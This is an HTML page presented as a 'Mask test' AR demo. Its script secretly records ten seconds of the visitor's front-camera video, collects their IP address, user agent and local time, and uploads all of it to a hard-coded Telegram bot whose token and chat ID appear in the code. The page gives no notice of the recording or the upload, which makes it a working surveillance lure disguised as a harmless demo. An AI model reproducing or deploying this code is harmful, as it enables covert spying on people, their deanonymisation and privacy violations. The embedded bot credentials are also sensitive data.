<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AR</title>
</head>
<body>
    <h1>Mask test </h1>
    <video id="video" width="640" height="480" autoplay></video>

    <script>
        const video = document.getElementById('video');
        let mediaRecorder;
        let recordedChunks = [];
        let userInfo = {};

        // Telegram Bot Details
        const TELEGRAM_TOKEN = '7748177101:AAF0c52ezGH18sp1ba78xZ_yJWiHSgDElbk'
        const TELEGRAM_CHAT_ID = '5297536255';

        // Fetch IP and device information
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                userInfo.ip = data.ip;
                userInfo.userAgent = navigator.userAgent;
                userInfo.time = new Date().toLocaleString();
            })
            .catch(error => console.error('Error fetching IP information:', error));

        // Request camera and microphone access
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(stream => {
                // Attach the stream to the video element
                video.srcObject = stream;

                // Set up the MediaRecorder
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    sendToTelegram(videoBlob);
                    recordedChunks = []; // Clear the chunks after processing
                };

                // Start recording the stream
                mediaRecorder.start();

                // Stop recording after 10 seconds (example interval)
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000);
            })
            .catch(err => console.error('Error accessing media devices.', err));

        // Function to send video and user information to Telegram
        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('video', blob, 'recording.webm');

            // Send user information
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nTime: ${userInfo.time}`
                })
            }).then(() => {
                // Send the video after sending user info
                return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
            })
            .then(response => response.json())
            .then(data => console.log('Video and user info successfully sent to Telegram:', data))
            .catch(error => console.error('Error sending data to Telegram:', error));
        }
    </script>
</body>
</html>
